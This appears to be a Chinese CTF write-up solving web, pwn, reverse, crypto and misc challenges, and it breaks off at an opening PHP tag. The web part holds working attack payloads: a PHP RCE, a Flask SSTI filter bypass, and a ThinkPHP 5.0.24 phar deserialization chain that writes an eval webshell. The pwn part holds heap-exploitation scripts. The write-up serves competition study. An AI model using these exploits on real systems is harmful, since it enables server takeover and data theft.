[{"content":"Web RCE_No_Para 无参数RCE，且过滤了部分函数。\n最终payload：\n?a=cat flag.php;\u0026amp;code=system(current(current(get_defined_vars()))); flask 查看网页源码\n\u0026lt;!--if not request.full_path.endswith(\u0026quot;.js?\u0026quot;): if not request.full_path.startswith(\u0026quot;/login\u0026quot;): return redirect(\u0026quot;login\u0026quot;)--\u0026gt; 要求路径是以/login开头，以.js?结尾，\n查看 flask 文档\nRequested path, including the query string.\n所以构造路径：\n/login/../admin?a=.js? 然后源码提示：\n\u0026lt;!--admin/?name=--\u0026gt; 使用以下路径发现是ssti\n/login/../admin?name={{7*7}}\u0026amp;a=.js? fuzz发现过滤了__，builtins，所以绕，最终payload\n/login/../admin?name={{config|attr('_'+'_init_'+'_')|attr('_'+'_globals_'+'_')|attr('_'+'_getitem_'+'_')('_'+'_buil'+'tins_'+'_')|attr('_'+'_getitem_'+'_')('eval')('_'+'_import_'+'_(\u0026quot;os\u0026quot;).popen(\u0026quot;cat /flag\u0026quot;).read()')}}\u0026amp;a=.js? tp 变量覆盖+phar反序列化+thinkphp 5.0.24反序列化写webshell\n生成phar文件\n\u0026lt;?php namespace think\\process\\pipes; class Windows { private $files = []; public function __construct() { $this-\u0026gt;files = [new \\think\\model\\Merge]; } } namespace think\\model; use think\\Model; class Merge extends Model { protected $append = []; protected $error; public function __construct() { $this-\u0026gt;append = [ \u0026#39;bb\u0026#39; =\u0026gt; \u0026#39;getError\u0026#39; ]; $this-\u0026gt;error = (new \\think\\model\\relation\\BelongsTo); } } namespace think; class Model{} namespace think\\console; class Output { protected $styles = []; private $handle = null; public function __construct() { $this-\u0026gt;styles = [\u0026#39;removeWhereField\u0026#39;]; $this-\u0026gt;handle = (new \\think\\session\\driver\\Memcache); } } namespace think\\model\\relation; class BelongsTo { protected $query; public function __construct() { $this-\u0026gt;query = (new \\think\\console\\Output); } } namespace think\\session\\driver; class Memcache { protected $handler = null; public function __construct() { $this-\u0026gt;handler = (new \\think\\cache\\driver\\Memcached); } } namespace think\\cache\\driver; class File { protected $tag; protected $options = []; public function __construct() { $this-\u0026gt;tag = false; $this-\u0026gt;options = [ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.base64-decode/resource=/var/www/html/public/\u0026#39;, ]; } } class Memcached { protected $tag; protected $options = []; protected $handler = null; public function __construct() { $this-\u0026gt;tag = true; $this-\u0026gt;options = [ \u0026#39;expire\u0026#39; =\u0026gt; 0, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4\u0026#39;, ]; $this-\u0026gt;handler = (new File); } } $obj = new \\think\\process\\pipes\\Windows(); @unlink(\u0026#34;or4nge.phar\u0026#34;); $phar = new \\Phar(\u0026#34;or4nge.phar\u0026#34;); //后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub $phar-\u0026gt;setMetadata($obj); //将自定义的meta-data存入manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //添加要压缩的文件 //签名自动计算 $phar-\u0026gt;stopBuffering(); 变量覆盖，触发反序列化\nimport requests url = \u0026#39;http://9316a714.lxctf.net/public/index.php/index/Index/upload\u0026#39; files = {\u0026#39;file\u0026#39;: (\u0026#39;or4nge\u0026#39;, open(\u0026#39;or4nge.phar\u0026#39;, \u0026#39;rb\u0026#39;))} r = requests.post(url, files=files) r = requests.post(url, params=\u0026#34;FILES[file][tmp_name]=or4nge.jpg\u0026amp;FILES[file][name]=phar://or4nge\u0026#34;) print(r.text) 会在 /var/www/html/public 下生成 8fba8bb6410a4aee90b063a8b7e78b73.php，文件内容包含 \u0026lt;?php eval($_GET['a']); 直接用就可以了。\nPwn pwn1 from pwn import * import sys context.log_level = \u0026#34;debug\u0026#34; if len(sys.argv) \u0026lt; 2: debug = True else: debug = False if debug: p = process(\u0026#34;./pwn1\u0026#34;) else: p = remote(\u0026#34;113.201.14.253\u0026#34;,16088) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *{b}\u0026#34;.format(b = hex(b))) else: gdb.attach(p) debugf(0x08048596) ru(\u0026#39;Gift:\u0026#39;) buf = int(ru(b\u0026#39;\\n\u0026#39;)[:-1],16) pay = p32(0x8048540)+b\u0026#39;a\u0026#39;*48 + p32(buf+4) sn(pay) #flag{474b7f9219effe69530da4ad63c1752a} p.interactive() pwn2 off by one\nfrom pwn import * import sys context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) if len(sys.argv) \u0026lt; 2: debug = True else: debug = False if debug: p = process(\u0026#34;./pwn2\u0026#34;) libc = ELF(\u0026#34;/lib/x86_64-linux-gnu/libc-2.27.so\u0026#34;) else: p = remote(\u0026#34;113.201.14.253\u0026#34;, 16066) libc = ELF(\u0026#34;./libc-2.27.so\u0026#34;) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *$rebase({b})\u0026#34;.format(b = hex(b))) else: gdb.attach(p) elf = ELF(\u0026#39;./pwn2\u0026#39;) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def menu(i): ru(\u0026#34;Choice: \u0026#34;) sl(str(i)) def add(size, content): menu(1) sla(\u0026#34;size: \u0026#34;, str(size)) sa(\u0026#34;content: \u0026#34;, content) def edit(idx,content): menu(2) sla(\u0026#34;idx: \u0026#34;, str(idx)) sla(\u0026#34;content: \u0026#34;, content) def free(idx): menu(3) sla(\u0026#34;idx: \u0026#34;, str(idx)) def show(idx): menu(4) sla(\u0026#34;idx: \u0026#34;, str(idx)) add(0x18, b\u0026#34;a\u0026#34; + b\u0026#34;\\n\u0026#34;) add(0x18, b\u0026#34;b\u0026#34;*0x18 + b\u0026#34;\\n\u0026#34;) for i in range(8): add(0x80, b\u0026#34;aaa\u0026#34; + b\u0026#34;\\n\u0026#34;) for i in range(8): free(9-i) free(0) add(0x18, b\u0026#34;a\u0026#34;*0x18 + b\u0026#34;\\xb1\u0026#34; + b\u0026#34;\\n\u0026#34;) free(1) add(0xa0, b\u0026#34;c\u0026#34; + b\u0026#34;\\n\u0026#34;) edit(1, b\u0026#34;c\u0026#34;*0x1f) show(1) libc.address = u64(p.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - 96 - 0x10 - libc.sym[\u0026#34;__malloc_hook\u0026#34;] print(hex(libc.address)) edit(1, b\u0026#34;c\u0026#34;*0x18 + p64(0x91) + p64(libc.sym[\u0026#34;__free_hook\u0026#34;]) + p64(96 + 0x10 + libc.sym[\u0026#34;__malloc_hook\u0026#34;])) add(0x80, b\u0026#34;/bin/sh\\x00\u0026#34; + b\u0026#34;\\n\u0026#34;) for i in range(7): add(0x80, b\u0026#34;aaa\u0026#34; + b\u0026#34;\\n\u0026#34;) free(9) edit(1, b\u0026#34;c\u0026#34;*0x18 + p64(0x91) + p64(libc.sym[\u0026#34;__free_hook\u0026#34;])*2) add(0x80, b\u0026#34;ddd\u0026#34; + b\u0026#34;\\n\u0026#34;) add(0x80, p64(libc.sym[\u0026#34;system\u0026#34;]) + b\u0026#34;\\n\u0026#34;) free(2) p.interactive() pwn3 随便玩玩拿到puts地址，写exit_hook拿shell\nfrom pwn import * import sys context.log_level = \u0026#34;debug\u0026#34; if len(sys.argv) \u0026lt; 2: debug = True else: debug = False if debug: p = process(\u0026#34;./Gpwn3\u0026#34;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) else: p = remote(\u0026#34;113.201.14.253\u0026#34;, 16033) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *{b}\u0026#34;.format(b = hex(b))) else: gdb.attach(p) def menu(i): sla(\u0026#39;choice:\u0026#39;, str(i)) def create(c): menu(1) sa(\u0026#39;:\u0026#39;, c) def up(c): menu(2) sa(\u0026#39;:\u0026#39;, c) create(b\u0026#39;\\xff\u0026#39;*35) # up(b\u0026#39;\\x01\u0026#39;*34+b\u0026#39;\\x00\u0026#39;) up(b\u0026#39;\\x01\u0026#39;) up(p64(2147483647)) menu(3) ru(\u0026#39;reward:\u0026#39;) libc.address = int(ru(b\u0026#39;\\n\u0026#39;)[:-1],16) - 0x06f6a0 log.warning(hex(libc.address)) ru(\u0026#39;name\u0026#39;) sn(p64(libc.address+0x5f0040+3848)) ru(\u0026#39;you!\u0026#39;) sn(p64(libc.address+0xf1247)) p.interactive() \u0026#39;\u0026#39;\u0026#39; 0x45226 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: rax == NULL 0x4527a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL \u0026#39;\u0026#39;\u0026#39; Reverse lemon 感谢 yaoxi 师傅送的一血（狗头）\nlemon 语言，仿照 HITCON cclemon，手动恢复字节码\nvar a = [65, 69, 83]; var b = [113, 105, 117, 113, 105, 117, 108, 101, 98, 105, 101, 122, 117, 111, 108, 101]; var c = 0; var d = []; while (c \u0026lt; 256){ d.append(c); c = c + 1; }; var e = 0; while (e \u0026lt; 256) { d[e] = (d[e] + a[e % 3] + b[e % 16]) % 256; e += 1; }; var f = 0; while (f \u0026lt; 3) { var g = 0; while (g \u0026lt; 256) { d[g] = d[g] ^ d[(g + 1) % 256]; g = g + 1; }; var h = 0; while (h \u0026lt; 256) { d[h] = (d[h] + 1) % 256; h = h + 1; }; f = f + 1; }; f = 0; var i = 0; while (f \u0026lt; 256) { i = i + d[f]; f = f + 1; }; i = i * 20 + 5; i = i * 30 - 5; i = i * 40 - 5; i = i * 50 + 6645; print(i); 运行结果就是flag\neasy_py uncompyle6反编译\nsleep+多线程，两个运算轮流进行\nIn [1]: cipher = [44, 100, 3, 50, 106, 90, 5, 102, 10, 112] In [2]: for i in range(0, 9, 2): ...: cipher[i] ^= cipher[i + 1] ...: cipher[i + 1] ^= i + 1 ...: In [3]: cipher Out[3]: [72, 101, 49, 49, 48, 95, 99, 97, 122, 121] In [4]: for c in cipher: ...: print (chr(c), end=\u0026#39;\u0026#39;) ...: He110_cazy combat_slogan jd-gui可出源码\npackage com.xaut; import java.io.PrintStream; import java.util.Scanner; public class Main { public static String stringTransformAscii(String value) { StringBuffer sbu = new StringBuffer(); char[] chars = value.toCharArray(); for (int i = 0; i \u0026lt; chars.length; i++) { if (i != chars.length - 1) { sbu.append(chars[i]).append(\u0026#34;,\u0026#34;); } else { sbu.append(chars[i]); } } return sbu.toString(); } public static String ttk(String input) { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; input.length(); i++) { char c = input.charAt(i); if ((c \u0026gt;= \u0026#39;a\u0026#39;) \u0026amp;\u0026amp; (c \u0026lt;= \u0026#39;m\u0026#39;)) { c = (char)(c + \u0026#39;\\r\u0026#39;); } else if ((c \u0026gt;= \u0026#39;A\u0026#39;) \u0026amp;\u0026amp; (c \u0026lt;= \u0026#39;M\u0026#39;)) { c = (char)(c + \u0026#39;\\r\u0026#39;); } else if ((c \u0026gt;= \u0026#39;n\u0026#39;) \u0026amp;\u0026amp; (c \u0026lt;= \u0026#39;z\u0026#39;)) { c = (char)(c - \u0026#39;\\r\u0026#39;); } else if ((c \u0026gt;= \u0026#39;N\u0026#39;) \u0026amp;\u0026amp; (c \u0026lt;= \u0026#39;Z\u0026#39;)) { c = (char)(c - \u0026#39;\\r\u0026#39;); } sb.append(c); } return sb.toString(); } public static void main(String[] args) { System.out.println(\u0026#34;Please input your keyword::\u0026#34;); Scanner scan = new Scanner(System.in); String str2 = \u0026#34;ddd\u0026#34;; if (scan.hasNextLine()) { str2 = scan.nextLine(); } scan.close(); String stringTransformAscii = stringTransformAscii(str2); String[] offerCodeString = stringTransformAscii.split(\u0026#34;,\u0026#34;); StringBuffer str5 = new StringBuffer(); for (String s : offerCodeString) { str5.append(s); } int flag = ttk(str2).compareTo(\u0026#34;Jr_j11y_s1tug_g0_raq_g0_raq_pnml\u0026#34;); if ((flag == 0) \u0026amp;\u0026amp; (str5.toString().compareTo(\u0026#34;871019511949491089510249103104116951164895101110100951164895101110100959997122121\u0026#34;) == 0)) { System.out.println(\u0026#34;Your keyword is correct!\u0026#34;); } else { System.out.println(\u0026#34;Your keyword is wrong!\u0026#34;); } } } ttk 凯撒 k=13\nWe_w11l_f1ght_t0_end_t0_end_cazy\nflag:\nflag{We_w11l_f1ght_t0_end_t0_end_cazy} cute_doge 运行后dump内存\n\r\n解base64\nZmxhZ3tDaDFuYV95eWRzX2Nhenl9\nflag:\nflag{Ch1na_yyds_cazy} Crypto LinearEquations 线性同余方程\nd[0] * b + d[1] * a + c = d[2] d[1] * b + d[2] * a + c = d[3] d[2] * b + d[3] * a + c = d[4] 所以有\n(d[1] - d[0]) * b + (d[2] - d[1]) * a = d[3] - d[2] (d[2] - d[1]) * b + (d[3] - d[2]) * a = d[4] - d[3] 求解同余方程即可\n直接放ipython的log了\nd = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396] n = 10104483468358610819 In [24]: from libnum import * In [25]: left = (d[4] - d[3]) * (d[1] - d[0]) % n - (d[3] - d[2]) * (d[2] - d[1]) % n In [26]: left Out[26]: 2071989288624214374 In [28]: right = (d[3] - d[2]) * (d[1] - d[0]) % n - (d[2] - d[1]) ** 2 % n In [29]: right Out[29]: -220570350959470413 In [30]: right %= n In [31]: right Out[31]: 9883913117399140406 In [32]: invmod(right, n) Out[32]: 9158039860152232368 In [33]: invmod(right, n) * left % n Out[33]: 5490290802446982981 In [34]: a = invmod(right, n) * left % n In [35]: n2s(a) Out[35]: b\u0026#39;L1near_E\u0026#39; In [36]: left = (d[3] - d[2]) % n In [37]: left = (d[3] - d[2]) % n - (d[2] - d[1]) * a % n In [38]: left Out[38]: 2594113358272023300 In [39]: left %= n In [40]: left Out[40]: 2594113358272023300 In [41]: right = d[1] - d[0] In [42]: left * invmod(right, n) Out[42]: 22730265397535795623381317872033942100 In [43]: b = left * invmod(right, n) % n In [44]: b Out[44]: 8175498372211240502 In [45]: n2s(b) Out[45]: b\u0026#39;qu4t1on6\u0026#39; In [46]: n2s(a) Out[46]: b\u0026#39;L1near_E\u0026#39; In [47]: n2s(b) Out[47]: b\u0026#39;qu4t1on6\u0026#39; In [48]: c = d[2] - d[0] * b - d[1] * a In [49]: c %= n In [50]: n2s(c) Out[50]: b\u0026#39;_1s_34sy\u0026#39; no_can_no_bb key 最大是 1 \u0026lt;\u0026lt; 20，可以直接爆破\n如果解密后开头为 cazy 说明正确\nfrom Crypto.Util.number import long_to_bytes from Crypto.Cipher import AES def pad(m): tmp = 16-(len(m)%16) return m + bytes([tmp for _ in range(tmp)]) def encrypt(m,key): aes = AES.new(key,AES.MODE_ECB) return aes.encrypt(m) c = b\u0026#39;\\x9d\\x18K\\x84n\\xb8b|\\x18\\xad4\\xc6\\xfc\\xec\\xfe\\x14\\x0b_T\\xe3\\x1b\\x03Q\\x96e\\x9e\\xb8MQ\\xd5\\xc3\\x1c\u0026#39; for i in range(1, (1 \u0026lt;\u0026lt; 20) + 1): key = pad(long_to_bytes(i)) aes = AES.new(key, AES.MODE_ECB) flag = aes.decrypt(c) if flag[:5] == b\u0026#39;cazy{\u0026#39;: print (flag) # b\u0026#39;cazy{n0_c4n,bb?n0p3!}\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\u0026#39; no_cry_no_can 福纳姆密码，密钥长度为 5，并且已知 flag 开头为 cazy{，所以直接解\nfrom libnum import * front = b\u0026#39;cazy{\u0026#39; cipher = b\u0026#39;\u0026lt;pH\\x86\\x1a\u0026amp;\u0026#34;m\\xce\\x12\\x00pm\\x97U1uA\\xcf\\x0c:NP\\xcf\\x18~l\u0026#39; key = bytes([f ^ c for f, c in zip(front, cipher)]) key *= 8 for c, k in zip(cipher, key): print (chr(c ^ k), end=\u0026#39;\u0026#39;) print() #cazy{y3_1s_a_h4nds0me_b0y!} math from math import gcd from gmpy2 import invert, is_prime from Crypto.Util.number import long_to_bytes as n2s invq = 0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3 e = 0x10005 d = 0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1 c = 0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386 kphi = e * d - 1 for k in range(1, e): if kphi % k == 0: phi = kphi // k x = invq * (phi - 1) + 1 g = pow(2, phi, x) - 1 for r in [3, 5]: g = gcd(g, pow(r, phi, x) - 1) if 1 \u0026lt; g \u0026lt; 10 * c: p = g break assert is_prime(p) m = pow(c, d, p) print(n2s(m)) #flag{c4617a206ba83d7f824dc44e5e67196a} no_math_no_cry 解方程就行\nsage:\n((x-(1\u0026lt;\u0026lt;500))**2+0x0338470-10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169).roots() 得到:\n[(6546781215792283740026379393655198304433284092086129578966582736192267592809173519135824526914006312711658519949412876200359056032790029580847075395203, 1), (175590630715657737802001590114848305707265818075457058980756525809979783549, 1)] 再long_to_bytes就行\n\r\nflag:\ncazy{1234567890_no_m4th_n0_cRy} Misc 八卦迷宫 直接走迷宫就行\n\r\nflag:\ncazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang} 朴实无华的取证 vol 内存取证 dump 出 我的日记.txt.txt，flag.zip 以及 flag.png 那个文件\n\r\n在 我的日记.txt.txt 找到压缩包密码 20211209\n\r\n\r\n得到 flag.zip 压缩包里的 encrypt.txt 内容\n//幼儿园水平的加密（部分） void Encrypt(string\u0026amp; str) { for(int i = 0; i \u0026lt; str.length(); i++) { if(str[i] \u0026gt;=\u0026#39;a\u0026#39;\u0026amp;\u0026amp; str[i]\u0026lt;=\u0026#39;w\u0026#39;) str[i]+=3; else if(str[i]==\u0026#39;x\u0026#39;) str[i]=\u0026#39;a\u0026#39;; else if(str[i]==\u0026#39;y\u0026#39;) str[i]=\u0026#39;b\u0026#39;; else if(str[i]==\u0026#39;z\u0026#39;) str[i]=\u0026#39;c\u0026#39;;\telse if(str[i]==\u0026#39;_\u0026#39;) str[i]=\u0026#39;|\u0026#39;; str[i] -= 32; } } 再通过 flag.png 的内容依照上面的 encrypt() 进行解密\n\r\nFDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF] \u0026gt;\u0026gt;\u0026gt; ss = \u0026#39;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]\u0026#39; \u0026gt;\u0026gt;\u0026gt; flag = \u0026#39;\u0026#39; \u0026gt;\u0026gt;\u0026gt; for i in range(len(ss)): ... flag += chr(ord(ss[i])+32) ... \u0026gt;\u0026gt;\u0026gt; flag \u0026#39;fdcb{Xldq_zloo_fhuwdlqob_vxffhhg_lq_iljkwlqj_wkh_hslghplf}\u0026#39; \u0026gt;\u0026gt;\u0026gt; flag.replace(\u0026#39;a\u0026#39;,\u0026#39;x\u0026#39;).replace(\u0026#39;b\u0026#39;,\u0026#39;y\u0026#39;).replace(\u0026#39;c\u0026#39;,\u0026#39;z\u0026#39;) \u0026#39;fdzy{Xldq_zloo_fhuwdlqoy_vxffhhg_lq_iljkwlqj_wkh_hslghplf}\u0026#39; sss = \u0026#39;fdzy{Xldq_zloo_fhuwdlqoy_vxffhhg_lq_iljkwlqj_wkh_hslghplf}\u0026#39; for i in range(len(sss)): if(ord(sss[i]) \u0026gt;= 100 and ord(sss[i]) \u0026lt;= 122): print(\u0026#34;i:\u0026#34;,i,\u0026#34;data:\u0026#34;,chr(ord(sss[i])-3)) print(sss) i: 0 data: c i: 1 data: a i: 2 data: w i: 3 data: v i: 6 data: i i: 7 data: a i: 8 data: n i: 10 data: w i: 11 data: i i: 12 data: l i: 13 data: l i: 15 data: c i: 16 data: e i: 17 data: r i: 18 data: t i: 19 data: a i: 20 data: i i: 21 data: n i: 22 data: l i: 23 data: v i: 25 data: s i: 26 data: u i: 27 data: c i: 28 data: c i: 29 data: e i: 30 data: e i: 31 data: d i: 33 data: i i: 34 data: n i: 36 data: f i: 37 data: i i: 38 data: g i: 39 data: h i: 40 data: t i: 41 data: i i: 42 data: n i: 43 data: g i: 45 data: t i: 46 data: h i: 47 data: e i: 49 data: e i: 50 data: p i: 51 data: i i: 52 data: d i: 53 data: e i: 54 data: m i: 55 data: i i: 56 data: c aaa = \u0026#34;fdzy{Xldq_zloo_fhuwdlqoy_vxffhhg_lq_iljkwlqj_wkh_hslghplf}\u0026#34; \u0026gt;\u0026gt;\u0026gt; flag2 = \u0026#34;\u0026#34; \u0026gt;\u0026gt;\u0026gt; for i in range(len(aaa)): ... flag2 += chr(ord(aaa[i])-3) \u0026gt;\u0026gt;\u0026gt; flag2 \u0026#39;cawvxUian\\\\will\\\\certainlv\\\\succeed\\\\in\\\\fighting\\\\the\\\\epidemicz\u0026#39; #根据上面的对应然后将其进行整理可得 cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic} flag:\ncazy{Xian_will_certainly_succeed_in_fighting_the_epidemic} 无字天书 蚁剑流量\n流量后面发现 zip 文件的头部 hex 504B\n\r\n提取出来后发现是一个 zip\n解压后得到 key.ws 和 flag.txt\n\r\nkey.ws是whitesapce\nhttp://vii5ard.github.io/whitespace/\n\r\n得到密码 XiAnWillBeSafe\n再去用 snow 去利用这个密码解 flag.txt\n\r\nflag:\ncazy{C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng} 西安加油 流量 http 对象导出 secret.txt\n解 base64 发现是一个压缩包\n后面部分就是拼图\n\r\n还原结果\n\r\nbinary file命令 显示这是个class文件\n利用luyten反编译得到源码\n发现是一堆数据 ascii转chr\nMDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA== base64之后得到1369个01的组合 可被开方为37推测其应该是一个二维码\n画图:\nfrom PIL import Image MAX = 37 pic = Image.new(\u0026#34;RGB\u0026#34;,(MAX,MAX)) str = \u0026#34;0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000\u0026#34; i = 0 for y in range(0,MAX): for x in range(0,MAX): if(str[i] == \u0026#39;0\u0026#39;): pic.putpixel([x,y],(0,0,0)) else: pic.putpixel([x,y],(255,255,255)) i = i + 1 pic.show() pic.save(\u0026#39;flag.png\u0026#39;) 得到的二维码扫码得到flag\n\r\nflag:\nflag{932b2c0070e4897ea7df0190dbf36ece} Ez_Steg 压缩包注释告诉说是6个数字 爆破压缩包密码得到220101\n然后得到两个文件\nstegosaurus工具求解pyc隐写\n\r\n得到 TheKey:St3g1sV3ryFuNny\nemjoy猜测是 emjoy-aes\nhttps://aghorler.github.io/emoji-aes/\n解码得到flag\nflag:\ncazy{Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke} ez_Encrypt 蚁剑流量\n解一下一开始的base64发现是pop链\n但是都不重要 直接锁定最后的web123\nbase64解开以后是一个压缩包\n解压后在app\\controller\\index.php找到了混淆后的php代码\n\u0026lt;?php 